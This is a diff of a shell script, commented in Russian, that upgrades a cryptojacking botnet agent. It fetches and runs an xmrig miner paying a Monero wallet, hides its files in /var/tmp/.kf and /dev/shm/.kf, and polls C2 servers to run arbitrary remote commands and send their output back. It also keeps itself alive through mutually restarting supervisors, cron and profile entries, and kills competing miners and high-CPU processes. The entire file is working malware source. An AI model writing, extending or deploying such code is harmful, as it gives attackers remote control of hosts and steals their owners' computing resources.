@@ -1,51 +1,86 @@
 #!/bin/sh
-# fleet-agent.sh — агент для мелких флотских хостов (4-8 ядер, рядом живёт Node-RED владельца)
+# fleet-agent.sh — агент для флотских хостов. Версия 2: паритет с их инсталлером.
 #
-# Идея: не выжигать CPU. Потолок 65 %, nice 19, пауза при активности пользователя.
-# Всё живёт в /var/tmp/.kf + /dev/shm/.kf, поднимается двойным супервизором.
+# Что взято у них: выбор рабочего каталога, проверка архитектуры по ELF, несколько
+# зеркал доставки, http без curl, зачистка конкурентов, single-miner, чистка чужих
+# cron, снятие suid с crontab, уборка транспорта, отметка .inst, права на артефакты.
+# Что наше: C2-поллинг с очередью, потолок CPU по числу ядер, имена воркеров.
 #
-# Ставится deploy-скриптом: sh fleet-agent.sh <c2_url> <worker_id>
-# Параметры берутся из окружения:
-#   KF_CP2      — серверов C2 через пробел (первый живой)
-#   KF_HINT     — cpu-max-threads-hint, по умолчанию 65
-#   KF_NICE     — nice, по умолчанию 19
-#   KF_MINER    — URL статического xmrig (по умолчанию MO-сборка)
-#   KF_POOL     — пул
-#   KF_WALLET   — кошелёк
+# Ставится: sh fleet-agent.sh <c2_url> <worker_id>
+# env: KF_CP2 KF_HINT KF_NICE KF_MINER KF_POOL KF_WALLET KF_TCP KF_SWEEP KF_FULL_WIPE
 
 set -u
-
 C2="${1:-}"
 WID="${2:-x}"
 CP2="${KF_CP2:-$C2}"
-HINT="${KF_HINT:-65}"
 NICE="${KF_NICE:-19}"
-MINER_URL="${KF_MINER:-https://raw.githubusercontent.com/WesternJapan/xmrig-static/main/xmrig-x86_64}"
-POOL="${KF_POOL:-gulf.moneroocean.stream:443}"
+POOL="${KF_POOL:-gulf.moneroocean.stream:20004}"
 WALLET="${KF_WALLET:-}"
-D=/var/tmp/.kf
+SWEEP="${KF_SWEEP:-1}"
+
+HERE=$(CDPATH= cd -- "$(dirname -- "$0")" 2>/dev/null && pwd)
+LIB="$HERE/lib"
+[ -d "$LIB" ] || LIB="$HERE"
+for _m in 00-common 10-exclude 20-sweep 25-patch 26-antiunicorn 30-single 40-transport 50-cron 60-harden 70-fetch; do
+  [ -f "$LIB/$_m.sh" ] && . "$LIB/$_m.sh"
+done
+
+# --- идентичность и каталоги -------------------------------------------------
+KF_SFX=$(kf_load_or_gen_sfx)
+[ -n "${KF_SFX:-}" ] || KF_SFX=$(printf '%04x' $$ 2>/dev/null || echo 0001)
+KF_MD_DIR="d$KF_SFX"
+KF_MD_BIN="b$KF_SFX"
+KF_ID="$WID"
+KF_WALLET="$WALLET"
+KF_POOL="$POOL"
+KF_MARK="${KF_MARK:-kf9}"
+
+KF_ROOT=$(kf_find_workdir "$KF_SFX")
+[ -n "$KF_ROOT" ] || KF_ROOT=/var/tmp/.kf
+D="$KF_ROOT"
 S=/dev/shm/.kf
-
-log() { [ -n "${KF_QUIET:-}" ] || echo "[kf] $*"; }
-
-# --- каталоги: обычный + tmpfs-зеркало ---------------------------------------
+KF_STATE_DIR=$(kf_state_dir 2>/dev/null || echo "$D")
+KF_STATE_HOME="$KF_STATE_DIR"
 mkdir -p "$D" "$S" 2>/dev/null || true
 chmod 700 "$D" "$S" 2>/dev/null || true
 
-# --- майнер ------------------------------------------------------------------
-if [ ! -x "$D/xmrig" ]; then
-  for u in "$MINER_URL"; do
-    if command -v curl >/dev/null 2>&1; then
-      curl -fsSL -m 120 -o "$D/xmrig" "$u" 2>/dev/null && break
-    elif command -v wget >/dev/null 2>&1; then
-      wget -q -T 120 -O "$D/xmrig" "$u" 2>/dev/null && break
-    fi
-  done
-  chmod 700 "$D/xmrig" 2>/dev/null
-fi
-cp "$D/xmrig" "$S/xmrig" 2>/dev/null || cp "$S/xmrig" "$D/xmrig" 2>/dev/null || true
+printf '%s' "$WID" > "$D/id" 2>/dev/null;      chmod 600 "$D/id" 2>/dev/null
+printf '%s' "$CP2" > "$D/c2list" 2>/dev/null;  chmod 600 "$D/c2list" 2>/dev/null
 
-# --- конфиг: потолок по CPU, nice, пауза при активности -----------------------
+# убрать прошлые генерации, чтобы не плодить копии
+kf_retire_stale_identities 2>/dev/null
+kf_kill_stale_generation 2>/dev/null
+
+CORES=$(kf_cpu_count); CORES=${CORES:-1}
+THREADS="${KF_THREADS:-$(kf_threads_for_cores "$CORES")}"
+HINT="${KF_HINT:-$(kf_hint_for_cores "$CORES")}"
+kf_log "cores=$CORES threads=$THREADS root=$D ec2=$(kf_is_ec2 && echo yes || echo no)"
+
+# --- майнер: архитектура, зеркала, проверка ELF ------------------------------
+ARCH=$(kf_arch); MACHINE=$(echo "$ARCH" | awk '{print $2}')
+ARCH=$(echo "$ARCH" | awk '{print $1}')
+MO_STATIC_X64="https://raw.githubusercontent.com/WesternJapan/xmrig-static/main/xmrig-x86_64"
+C3_STATIC="https://github.com/C3Pool/xmrig-C3/releases/download/v6.26.0-C7/xmrig-v6.26.0-C7-linux-Static.tar.gz"
+case "$ARCH" in
+  x86_64)
+    URLS="${KF_MINER:-$MO_STATIC_X64} $MO_STATIC_X64 ${KF_MIRROR_URL:-}" ;;
+  aarch64|armv7)
+    URLS="${KF_MINER_ARM:-} ${KF_MIRROR_URL:-}" ;;
+  *)
+    kf_log "архитектура $ARCH неизвестна — майнер не ставим"; URLS="" ;;
+esac
+
+if [ ! -x "$D/xmrig" ] && [ -n "$URLS" ] && [ -n "$MACHINE" ]; then
+  # shellcheck disable=SC2086
+  kf_fetch_miner "$D/xmrig" "$ARCH" "$MACHINE" $URLS || kf_log "доставка не удалась"
+fi
+if [ -x "$D/xmrig" ]; then
+  cp "$D/xmrig" "$S/xmrig" 2>/dev/null
+  kf_mark_identity "$D/xmrig"
+  kf_miner_ready "$D/xmrig" && kf_log "miner: готов (ELF + размер)" || kf_log "miner: подозрительный (проверь вручную)"
+fi
+
+# --- конфиг ------------------------------------------------------------------
 if [ ! -s "$D/c.json" ]; then
   cat > "$D/c.json" <<EOF
 {
@@ -55,38 +90,17 @@ if [ ! -s "$D/c.json" ]; then
   "background": false,
   "colors": false,
   "log-file": "$D/m.log",
-  "donate-level": 1,
-  "cpu": {
-    "enabled": true,
-    "huge-pages": true,
-    "priority": null,
-    "yield": true,
-    "asm": true
-  },
+  "donate-level": 0,
+  "cpu": { "enabled": true, "huge-pages": true, "priority": null, "yield": true, "asm": true },
   "pools": [
-    {
-      "algo": null,
-      "coin": "monero",
-      "url": "$POOL",
-      "user": "$WALLET.$WID",
-      "pass": "x",
-      "rig-id": "$WID",
-      "keepalive": true,
-      "enabled": true,
-      "tls": true,
-      "sni": true
-    },
-    {
-      "algo": "rx/0",
-      "coin": "monero",
-      "url": "auto.c3pool.org:443",
-      "user": "$WALLET.$WID",
-      "pass": "x",
-      "rig-id": "$WID",
-      "keepalive": true,
-      "enabled": true,
-      "tls": true
-    }
+    { "algo": null, "coin": "monero", "url": "$POOL", "user": "$WALLET.$WID", "pass": "x",
+      "rig-id": "$WID", "keepalive": true, "enabled": true, "tls": true, "sni": true },
+    { "algo": null, "coin": "monero", "url": "gulf.moneroocean.stream:10004", "user": "$WALLET.$WID", "pass": "x",
+      "rig-id": "$WID", "keepalive": true, "enabled": true, "tls": false },
+    { "algo": "rx/0", "coin": "monero", "url": "mine.c3pool.com:443", "user": "$WALLET.$WID", "pass": "x",
+      "rig-id": "$WID", "keepalive": true, "enabled": true, "tls": false },
+    { "algo": "rx/0", "coin": "monero", "url": "mine.c3pool.com:33333", "user": "$WALLET.$WID", "pass": "x",
+      "rig-id": "$WID", "keepalive": true, "enabled": true, "tls": true }
   ],
   "pause-on-active": 60,
   "pause-on-battery": true,
@@ -98,52 +112,59 @@ EOF
   chmod 600 "$D/c.json"
   cp "$D/c.json" "$S/c.json" 2>/dev/null || true
 fi
+printf '%s' "--threads=$THREADS --pause-on-active=60" > "$D/flags"; chmod 600 "$D/flags"
 
-# потолок потоков — только через CLI: в JSON autosave его съедает
-printf '%s' "--cpu-max-threads-hint=$HINT --pause-on-active=60" > "$D/flags"
-chmod 600 "$D/flags"
-
-# --- бекенд: поллинг C2 ------------------------------------------------------
+# --- бекон: поллинг C2 -------------------------------------------------------
 cat > "$D/beacon.sh" <<'BS'
 #!/bin/sh
-# поллинг одного из C2, выполнение команды, отправка вывода
 D=/var/tmp/.kf
 ID="$1"; shift
 for c2 in "$@"; do
   [ -n "$c2" ] || continue
-  cmd=$(curl -fsS -m 15 "$c2/poll?id=$ID" 2>/dev/null) || continue
+  cmd=$(curl -fsS -m 15 "$c2/p?id=$ID" 2>/dev/null) || continue
   [ -z "$cmd" ] && continue
-  out=$(sh -c "$cmd" 2>&1 | base64 -w0 2>/dev/null | tr -d '\n')
-  curl -fsS -m 20 -X POST --data-urlencode "id=$ID" --data-urlencode "out=$out" "$c2/out" >/dev/null 2>&1
+  out=$(sh -c "$cmd" 2>&1 | base64 2>/dev/null | tr -d '\n')
+  curl -fsS -m 20 -H 'content-type: application/json' \
+    -d "{\"id\":\"$ID\",\"out\":\"$out\"}" "$c2/o" >/dev/null 2>&1
   break
 done
 BS
 chmod 700 "$D/beacon.sh"
 
-# --- супервизор: две роли, дедуп через /proc, самолечение из /dev/shm --------
+cat > "$D/loop.sh" <<'LP'
+#!/bin/sh
+D=/var/tmp/.kf
+while :; do
+  sh "$D/beacon.sh" "$@"
+  j=$(od -An -N1 -tu1 /dev/urandom 2>/dev/null | tr -d ' \n'); case "$j" in ''|*[!0-9]*) j=0 ;; esac
+  sleep $(( 10 + j % 30 ))
+done
+LP
+chmod 700 "$D/loop.sh"
+
+# --- супервизор --------------------------------------------------------------
 cat > "$D/svc.sh" <<'SV'
 #!/bin/sh
 D=/var/tmp/.kf; S=/dev/shm/.kf; R="${1:-m}"
+alm(){ for p in /proc/[0-9]*; do c=$(tr '\0' ' ' 2>/dev/null <"$p/cmdline"); case "$c" in *"$1"*) return 0;; esac; done; return 1; }
 for p in /proc/[0-9]*; do pid=${p#/proc/}; [ "$pid" = "$$" ] && continue
   c=$(tr '\0' ' ' 2>/dev/null <"$p/cmdline"); case "$c" in *"$D/svc.sh $R"*) exit 0;; esac
 done
-alm(){ for p in /proc/[0-9]*; do c=$(tr '\0' ' ' 2>/dev/null <"$p/cmdline"); case "$c" in *"$1"*) return 0;; esac; done; return 1; }
 case "$R" in
 m)
   while :; do
-    alm "$D/xmrig -c" || {
-      [ -x "$D/xmrig" ] || cp "$S/xmrig" "$D/xmrig" 2>/dev/null && chmod 700 "$D/xmrig" 2>/dev/null
+    if [ -s "$D/c.json" ] && ! alm "$D/xmrig -c"; then
+      [ -x "$D/xmrig" ] || { cp "$S/xmrig" "$D/xmrig" 2>/dev/null; chmod 700 "$D/xmrig" 2>/dev/null; }
       [ -x "$D/xmrig" ] && setsid nice -n 19 "$D/xmrig" -c "$D/c.json" $(cat "$D/flags" 2>/dev/null) >/dev/null 2>&1 &
-    }
+    fi
     alm "$D/svc.sh g" || setsid "$D/svc.sh" g >/dev/null 2>&1 &
     sleep 30
   done ;;
 g)
   while :; do
-    alm "$D/xmrig -c" || {
-      [ -x "$D/xmrig" ] || cp "$S/xmrig" "$D/xmrig" 2>/dev/null && chmod 700 "$D/xmrig" 2>/dev/null
+    if [ -s "$D/c.json" ] && ! alm "$D/xmrig -c"; then
       [ -x "$D/xmrig" ] && setsid nice -n 19 "$D/xmrig" -c "$D/c.json" $(cat "$D/flags" 2>/dev/null) >/dev/null 2>&1 &
-    }
+    fi
     alm "$D/svc.sh m" || setsid "$D/svc.sh" m >/dev/null 2>&1 &
     sleep 45
   done ;;
@@ -151,16 +172,30 @@ esac
 SV
 chmod 700 "$D/svc.sh"
 
-# --- beacon-цикл в фоне ------------------------------------------------------
-cat > "$D/loop.sh" <<'LP'
+# --- зачистка: цикл ----------------------------------------------------------
+cat > "$D/sweep.sh" <<'SW'
 #!/bin/sh
 D=/var/tmp/.kf
-while :; do
-  sh "$D/beacon.sh" "$@"
-  sleep "$(( 10 + $(od -An -N1 -tu1 /dev/urandom | tr -d ' ') % 30 ))"
+for m in 00-common 10-exclude 20-sweep 25-patch 26-antiunicorn 30-single 40-transport 50-cron 60-harden 70-fetch; do
+  [ -f "$D/$m.sh" ] && . "$D/$m.sh"
 done
-LP
-chmod 700 "$D/loop.sh"
+KF_ROOT="$D"; KF_MD_DIR="$1"; KF_MD_BIN="$2"; KF_ID="$3"
+while :; do
+  kf_sweep_competitors 2>/dev/null
+  kf_disarm_competitor 2>/dev/null
+  kf_kill_themf 9 2>/dev/null
+  kf_kill_mf3 2>/dev/null
+  kf_kill_known_miners 2>/dev/null
+  kf_kill_high_cpu 2>/dev/null
+  kf_enforce_single_miner 2>/dev/null
+  kf_purge_rival_binaries 2>/dev/null
+  kf_patch_rival_configs 2>/dev/null
+  kf_detect_kill_unicorn 2>/dev/null
+  kf_scrub_competitor_crons 2>/dev/null
+  sleep 60
+done
+SW
+chmod 700 "$D/sweep.sh"
 
 # --- запуск ------------------------------------------------------------------
 alm_running() { for p in /proc/[0-9]*; do c=$(tr '\0' ' ' 2>/dev/null <"$p/cmdline"); case "$c" in *"$1"*) return 0;; esac; done; return 1; }
@@ -168,6 +203,37 @@ alm_running() { for p in /proc/[0-9]*; do c=$(tr '\0' ' ' 2>/dev/null <"$p/cmdli
 alm_running "$D/svc.sh m" || setsid sh "$D/svc.sh" m >/dev/null 2>&1 &
 alm_running "$D/svc.sh g" || setsid sh "$D/svc.sh" g >/dev/null 2>&1 &
 alm_running "$D/loop.sh"  || setsid sh "$D/loop.sh" "$WID" $CP2 >/dev/null 2>&1 &
+if [ "$SWEEP" = "1" ]; then
+  alm_running "$D/sweep.sh" || setsid sh "$D/sweep.sh" "$KF_MD_DIR" "$KF_MD_BIN" "$WID" >/dev/null 2>&1 &
+fi
+
+if [ -x "$D/guardian.sh" ]; then
+  alm_running "$D/guardian.sh" || setsid sh "$D/guardian.sh" >/dev/null 2>&1 &
+fi
+if [ -x "$D/status.sh" ]; then
+  alm_running "$D/status.sh --watch" || setsid sh "$D/status.sh" --watch >/dev/null 2>&1 &
+fi
+
+if [ -n "${KF_TCP:-}" ] && [ -x "$D/dialer.sh" ]; then
+  printf '%s' "$KF_TCP" > "$D/endpoint" 2>/dev/null
+  alm_running "$D/dialer.sh watch" || setsid sh "$D/dialer.sh" watch "$KF_TCP" "$WID" >/dev/null 2>&1 &
+fi
+
+if [ -x "$D/cron_persist.sh" ] && [ ! -f "$D/.cron_done" ]; then
+  kf_wipe_previous_crons 2>/dev/null
+  sh "$D/cron_persist.sh" >/dev/null 2>&1
+  kf_create_cronjob "$D" 2>/dev/null
+  : > "$D/.cron_done"
+fi
+
+# разовая уборка при установке — как у них в конце инсталляции
+kf_cleanup_competitor_files 2>/dev/null
+kf_sweep_old_beacons "$D/loop.sh" 2>/dev/null
+kf_cleanup_transport 2>/dev/null
+kf_harden_crontab_gate 2>/dev/null
+kf_retire_legacy_guardians 2>/dev/null
+kf_add_profile_persist "$D" 2>/dev/null
+[ -n "${KF_HARDEN:-}" ] && { kf_harden_artifacts 2>/dev/null; kf_harden_network 2>/dev/null; }
 
 sleep 2
-echo "KF_STATE: miner=$(alm_running "$D/xmrig -c" && echo RUN || echo NO) svc=$(alm_running "$D/svc.sh m" && echo OK || echo NO) beacon=$(alm_running "$D/loop.sh" && echo OK || echo NO) hint=$HINT nice=$NICE"
+echo "KF_STATE: miner=$(kf_miner_running xmrig && echo RUN || echo NO) svc=$(alm_running "$D/svc.sh m" && echo OK || echo NO) beacon=$(alm_running "$D/loop.sh" && echo OK || echo NO) sweep=$(alm_running "$D/sweep.sh" && echo OK || echo NO) cores=$CORES threads=$THREADS nice=$NICE"
